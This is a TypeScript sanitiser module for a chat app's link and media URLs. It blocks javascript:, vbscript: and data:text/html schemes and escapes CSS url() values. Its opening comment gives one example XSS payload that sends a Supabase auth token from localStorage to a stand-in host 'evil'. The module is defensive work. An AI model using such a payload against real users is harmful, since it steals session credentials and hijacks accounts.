// Guard href/src values that may carry attacker-controlled content. A message's
// `media_url` is a free-form column any user can set to an arbitrary string via
// the Supabase REST API (RLS lets you insert your own messages), so a hostile
// value like `javascript:fetch('//evil/'+localStorage.getItem('sb-...-auth-token'))`
// would run in the victim's origin when they click the file link. React does not
// block `javascript:` hrefs (dev-warns only), so we validate the scheme here.
//
// Only http(s) is allowed through for navigation links. Image/video may also use
// data:image/* (stickers) and blob: (local previews). Legitimate Supabase storage
// URLs are always https.

const DANGEROUS = /^(javascript|vbscript|data\s*:?\s*text\/html)/i;

/** http(s) only — safe for <a href>. */
export function safeHref(u?: string | null): string | undefined {
  if (!u) return undefined;
  const trimmed = String(u).trim();
  if (!trimmed || DANGEROUS.test(trimmed)) return undefined;
  try {
    const parsed = new URL(trimmed, typeof window !== 'undefined' ? window.location.origin : 'https://lumixo.app');
    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') return trimmed;
    return undefined;
  } catch {
    return undefined;
  }
}

/**
 * Safe for <img src> / <video src>: http(s), data:image/*, blob:.
 * Blocks javascript:, data:text/html, vbscript:.
 */
export function safeMediaSrc(u?: string | null): string | undefined {
  if (!u) return undefined;
  const trimmed = String(u).trim();
  if (!trimmed || DANGEROUS.test(trimmed)) return undefined;
  if (/^data:image\//i.test(trimmed)) return trimmed;
  if (/^blob:/i.test(trimmed)) return trimmed;
  return safeHref(trimmed);
}

/**
 * Safe CSS `url(...)` value for backgroundImage. Returns undefined if unsafe.
 * Escapes quotes/parentheses so a crafted URL cannot break out of url().
 */
export function safeCssUrl(u?: string | null): string | undefined {
  const href = safeHref(u);
  if (!href) return undefined;
  // Encode characters that terminate or break CSS url() tokens.
  const encoded = href
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/'/g, "\\'")
    .replace(/[\r\n\f]/g, '');
  return `url("${encoded}")`;
}
